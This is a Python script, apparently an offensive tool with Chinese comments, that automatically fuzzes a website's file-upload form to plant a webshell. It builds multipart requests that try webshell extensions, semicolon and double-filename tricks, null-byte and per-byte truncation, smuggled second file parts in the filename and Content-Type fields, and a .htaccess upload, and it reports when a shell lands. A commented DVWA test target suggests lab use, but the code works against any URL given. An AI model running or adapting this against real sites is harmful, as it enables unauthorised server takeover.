import pdb
import re
import urllib.request
import urllib.error
import urllib.parse
import sys
import argparse
import chardet
from exp10it import get_request
from exp10it import get_param_part_from_content
from exp10it import CONTENT_TYPE_LIST


def unicode_to_bytes(unicode_string):
    # 获取变量如'a\xff'的二进制结果:b'a\xff'
    return b"".join([b'%c' % ord(each_unicode) for each_unicode in unicode_string])


def get_form_data_post_info(url, cookie):
    # 获取通过multipart_form_data上传文件的信息
    # return_value['form_data_dict']为multipart form data中的非文件参数字典
    # return_value['form_file_param_name']为multipart form data中的文件参数名
    form_data_dict = {}
    form_file_param_name = ''
    origin_html = ''
    return_value = {'form_data_dict': form_data_dict,
                    'form_file_param_name': form_file_param_name,
                    'origin_html': origin_html}
    rsp = get_request(url, cookie=cookie)
    origin_html = rsp['content']
    if not re.search(r"<form\s+", origin_html, re.I):
        print("Sorry,I can't find any form.")
        sys.exit(1)
    param_part = get_param_part_from_content(origin_html)
    param_list = param_part.split("&")
    for param_and_value in param_list:
        _ = param_and_value.split("=")
        param = _[0]
        value = _[1]
        if value != "filevalue":
            # 非文件参数
            form_data_dict[param] = value
        else:
            # 文件参数
            form_file_param_name = param

    return_value['form_data_dict'] = form_data_dict
    return_value['form_file_param_name'] = form_file_param_name
    return_value['origin_html'] = origin_html
    return return_value


def post_multipart_form_data(url, cookie, form_data_dict, boundary, form_file_param_name='', file_content='', filename='', content_type=''):
    # form_file_param_name为表单中的文件参数名
    # file_content为文件内容,string格式
    code = 0
    html = ''
    return_value = {'code': code, 'html': html}
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
               'Referer': '%s' % url,
               'Cookie': '%s' % cookie,
               'Connection': 'close',
               'Upgrade-Insecure-Requests': '1',
               'Content-Type': 'multipart/form-data; boundary=%s' % boundary}

    data = []
    for key in form_data_dict:
        data.append('--%s\r\n' % boundary)
        value = form_data_dict[key]
        data.append('Content-Disposition: form-data; name="%s"\r\n\r\n' % key)
        data.append(value + "\r\n")
    if form_file_param_name != "" and file_content != "" and filename != "" and content_type != "":
        data.append('--%s\r\n' % boundary)
        data.append('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' %
                    (form_file_param_name, filename))
        data.append('Content-Type: %s\r\n\r\n' % content_type)
        data.append(file_content + "\r\n")
    data.append('--%s--' % boundary)
    data = ''.join(data)
    proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
    opener = urllib.request.build_opener(proxy)
    urllib.request.install_opener(opener)
    req = urllib.request.Request(
        url, headers=headers, data=unicode_to_bytes(data))
    with urllib.request.urlopen(req) as response:
        code = response.code
        html = response.read()
        encoding = chardet.detect(html)['encoding']
        html = html.decode(encoding=encoding)
    return_value['code'] = code
    return_value['html'] = html
    return return_value


def get_work_file_info(url, cookie, form_data_dict, boundary, form_file_param_name):
    file_suffix_list = ['jpg', 'png', 'gif', 'txt']
    for file_suffix in file_suffix_list:
        filename = "test.%s" % file_suffix
        if file_suffix == 'jpg':
            file_content = jpg_file_content
            content_type = 'image/jpeg'
            rsp = post_multipart_form_data(
                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
            if rsp['code'] == 200:
                return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content}
        elif file_suffix == 'png':
            file_content = png_file_content
            content_type = 'image/png'
            rsp = post_multipart_form_data(
                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
            if rsp['code'] == 200:
                return {'file_suffix': 'png', 'content_type': 'image/png', 'file_content': png_file_content}
        elif file_suffix == 'gif':
            file_content = gif_file_content
            content_type = 'image/gif'
            rsp = post_multipart_form_data(
                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
            if rsp['code'] == 200:
                return {'file_suffix': 'gif', 'content_type': 'image/gif', 'file_content': gif_file_content}
        elif file_suffix == 'txt':
            file_content = gif_file_content
            content_type = 'text/plain'
            rsp = post_multipart_form_data(
                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
            if rsp['code'] == 200:
                return {'file_suffix': 'txt', 'content_type': 'text/plain', 'file_content': gif_file_content}
    print("正常上传jpg/gif/png/txt全部失败,这个url的上传功能可能存在问题...")
    sys.exit(1)


def check_upload_succeed(rsp, origin_html):
    code = rsp['code']
    html = rsp['html']
    if code != 200:
        return False
    lines = re.findall(r"([^\r\n]+)", html)
    for line in lines:
        if not re.match(r"^\s+$", line) and line not in origin_html:
            result = re.search(r"([^\s<>]+\.%s)" % script_suffix, line, re.I)
            if result:
                result = result.group(1)
                print(result)
                pdb.set_trace()
                print("Congratulations! Upload webshell succeed!")
                sys.exit(1)


def fuzz_upload_webshell():
    # url = 'http://192.168.135.39/dvwa/vulnerabilities/upload/'
    # cookie = 'security=low; PHPSESSID=cl4u4quib5tebhico07nopn2o0'
    work_file_info = get_work_file_info(
        url, cookie, form_data_dict, boundary, form_file_param_name)
    print(work_file_info)
    # 正常文件和webshell的后缀分别为work_suffix和script_suffix
    work_suffix = work_file_info['file_suffix']
    work_file_content = work_file_info['file_content']
    work_content_type = work_file_info['content_type']
    if script_suffix == "php":
        webshell_content_type = "text/php"
    elif script_suffix == "asp":
        webshell_content_type = "application/octet-stream"
    elif script_suffix == "aspx":
        webshell_content_type = "application/octet-stream"
    elif script_suffix == "jsp":
        webshell_content_type = "application/octet-stream"

    fuzz_file_name = [
        {'desc': '修改后缀为webshell后缀',
            'modify': {'filename': 'test.%s' % script_suffix}},
        {'desc': '修改后缀为正常后缀接";test.php",eg:"test.jpg;test.php"',
            'modify': {'filename': 'test.%s;test.%s' % (work_suffix, script_suffix)}},
        {'desc': '两个filename参数且前正常文件后webshell', 'modify': {
            'filename': 'test.%s"; filename="test.%s' % (work_suffix, script_suffix)}},
        {'desc': '两个filename参数且前webshell后正常文件', 'modify': {
            'filename': 'test.%s"; filename="test.%s' % (script_suffix, work_suffix)}},
        # 双文件上传时,只修改file_name值的情况下可控的位置为两个文件的后缀与第一个文件的content-type,共4种情况
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改',
            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
                work_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type',
            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
                work_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
        {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type未修改',
            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
                script_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
        {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type修改为正常文件的content-type',
            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
                script_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},

    ]
    for i in range(0, 256):
        item = {'desc': '%00截断组,' + hex(i) + '截断', 'modify': {
            'filename': 'test.%s%s.%s' % (script_suffix, chr(i), work_suffix)}}
        fuzz_file_name.append(item)
        item = {'desc': '两个filename参数且前正常文件后webshell,且两个filename参数以' + hex(i) + '分割', 'modify': {
            'filename': 'test.%s";%sfilename="test.%s' % (work_suffix, chr(i), script_suffix)}}
        fuzz_file_name.append(item)
        item = {'desc': '两个filename参数且前webshell后正常文件,且两个filename参数以' + hex(i) + '分割', 'modify': {
            'filename': 'test.%s";%sfilename="test.%s' % (script_suffix, chr(i), work_suffix)}}
        fuzz_file_name.append(item)
    if script_suffix == "php":
        item = {'desc': '上传.htaccess,只适用于php',
                'modify': {'filename': '.htaccess'}}
        fuzz_file_name.append(item)

    fuzz_content_type = [
        {'desc': '修改content-type为image/jpeg',
            'modify': {'content_type': 'image/jpeg'}},
        {'desc': '修改content_type为image/gif',
            'modify': {'content_type': 'image/jpeg'}},
        {'desc': '修改content_type为image/png',
            'modify': {'content_type': 'image/jpeg'}},
        {'desc': '修改content_type为text/plain',
            'modify': {'content_type': 'image/jpeg'}},
        # 双文件上传时,只修改content-type值的情况下可控的位置为两个文件的content-type,共4种情况
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type未修改',
            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
                work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type未修改',
            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
                webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type修改为正常文件的content-type',
            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
                work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type修改为正常文件的content-type',
            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
                webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
    ]
    for each in CONTENT_TYPE_LIST:
        item = {'desc': '修改content-type为%s' % each,
                'modify': {'content_type': each}}
        fuzz_content_type.append(item)

    for filename_item in fuzz_file_name:
        try:
            print(filename_item['desc'])
        except:
            print(filename_item)
            pdb.set_trace()
        filename = filename_item['modify']['filename']
        file_content = work_file_info['file_content']
        content_type = work_file_info['content_type']
        rsp = post_multipart_form_data(
            url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
        check_upload_succeed(rsp, origin_html)

    for content_type_item in fuzz_content_type:
        print(content_type_item['desc'])
        filename = "test.%s" % script_suffix
        content_type = content_type_item['modify']['content_type']
        file_content = work_file_info['file_content']
        rsp = post_multipart_form_data(
            url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
        check_upload_succeed(rsp, origin_html)

    for filename_item in fuzz_file_name:
        for content_type_item in fuzz_content_type:
            print(filename_item['desc'])
            print(content_type_item['desc'])
            filename = filename_item['modify']['filename']
            content_type = content_type_item['modify']['content_type']
            file_content = work_file_info['file_content']
            rsp = post_multipart_form_data(
                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
            check_upload_succeed(rsp, origin_html)


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url")
parser.add_argument("--cookie")
parser.add_argument("--suffix")
args = parser.parse_args()
url = args.url
cookie = args.cookie
script_suffix = args.suffix
"""
gif_file_content,jpg_file_content,png_file_content都是从正常的对应文件的16进制中
抽取的前2行和最后2行的16进制数据,如果要插入webshell内容则最好在第2行之后第3行之前

gif_file_content = '''
00000000: 4749 4638 3961 c800 c800 f700 0000 0000  GIF89a..........
00000010: 0000 3900 0041 0000 3100 0008 0000 2900  ..9..A..1.....).
0007c700: 84a2 2c6a 0545 109e 8160 2045 c896 7284  ..,j.E...` E..r.
0007c710: 9f59 0100 cf88 80cd 5944 4000 003b       .Y......YD@..;
'''
jpg_file_content = '''
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
00000010: 0048 0000 ffdb 0043 0003 0202 0202 0203  .H.....C........
00000020: 4bff 007f 3ffa f457 4660 8327 f729 ff00  K...?..WF`.'.)..
00000030: 7c8a 2b4b 3ee3 e63f ffd9                 |.+K>..?..
'''
png_file_content = '''
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0118 0000 00d2 0806 0000 0091 8adf  ................
00000020: 6500 3138 304b 4242 b9fe 053d 0000 0000  e.180KBB...=....
00000030: 4945 4e44 ae42 6082                      IEND.B`.
'''
"""
gif_file_content = '\x47\x49\x46\x38\x39\x61\xc8\x00\xc8\x00\xf7\x00\x00\x00\x00\x00\x00\x00\x39\x00\x00\x41\x00\x00\x31\x00\x00\x08\x00\x00\x29\x00\x84\xa2\x2c\x6a\x05\x45\x10\x9e\x81\x60\x20\x45\xc8\x96\x72\x84\x9f\x59\x01\x00\xcf\x88\x80\xcd\x59\x44\x40\x00\x00\x3b'
jpg_file_content = '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x4b\xff\x00\x7f\x3f\xfa\xf4\x57\x46\x60\x83\x27\xf7\x29\xff\x00\x7c\x8a\x2b\x4b\x3e\xe3\xe6\x3f\xff\xd9'
png_file_content = '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x01\x18\x00\x00\x00\xd2\x08\x06\x00\x00\x00\x91\x8a\xdf\x65\x00\x31\x38\x30\x4b\x42\x42\xb9\xfe\x05\x3d\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82'
info = get_form_data_post_info(url, cookie)
form_data_dict = info['form_data_dict']
form_file_param_name = info['form_file_param_name']
origin_html = info['origin_html']
boundary = '-------------------------7df3069603d6'


if __name__ == "__main__":
    fuzz_upload_webshell()
